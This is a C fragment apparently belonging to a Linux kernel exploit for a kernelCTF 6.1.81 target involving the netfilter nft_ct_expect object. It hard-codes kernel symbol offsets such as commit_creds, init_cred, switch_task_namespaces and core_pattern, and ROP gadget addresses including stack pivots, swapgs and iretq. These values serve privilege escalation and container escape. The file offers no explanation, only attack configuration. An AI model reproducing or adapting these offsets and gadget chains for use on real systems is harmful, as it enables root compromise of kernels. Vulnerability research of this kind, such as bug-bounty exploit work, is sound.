#include <stddef.h>
#include <unistd.h>
// 6.1.81 kctf release
size_t nft_ct_expect_obj_type = 0x2b6d0c0;
size_t nft_ct_expect_obj_ops = 0x1b2b740;
size_t init_cred = 0x2876ac0;
size_t init_nsproxy = 0x2876880;
size_t core_pattern = 0x29bab60;
size_t commit_creds = 0x1be550;
size_t find_task_by_vpid = 0x1b4f20;
size_t switch_task_namespaces = 0x1bc9b0;
size_t rcu_read_unlock = 0x2122b0;
size_t copy_from_user = 0x8690d0;
size_t msleep = 0x227a50;
size_t delay_loop = 0x11228a0;

size_t push_rax_jmp_deref_rsi_0x77 = 0xb08e05; // push rax ; jmp qword ptr [rsi - 0x77]
size_t push_rsi_jmp_deref_rsi_0x39 = 0x988647; // push rsi ; jmp qword ptr [rsi + 0x39]
size_t swapgs = 0x12012e8; //
size_t iretq = 0x1201220;
size_t pop_rdi = 0x12c7c0;
size_t pop_rsi = 0x2e2a6;
size_t pop_rcx = 0x44aa63;
size_t pop_rax = 0x8f9b7d;
size_t pop_3 = 0x113164; // pop r12 ; pop rbp ; pop rbx ; ret
size_t pop_rsp_ret = 0xdb7e0;
size_t add_rsp_0x50 = 0x248c16; // add rsp, 0x50 ; jmp 0xffffffff82203980 (ret)
size_t pop_2 = 0x113166; // pop rbp ; pop rbx ; ret
size_t pop_rdx = 0x848e2;
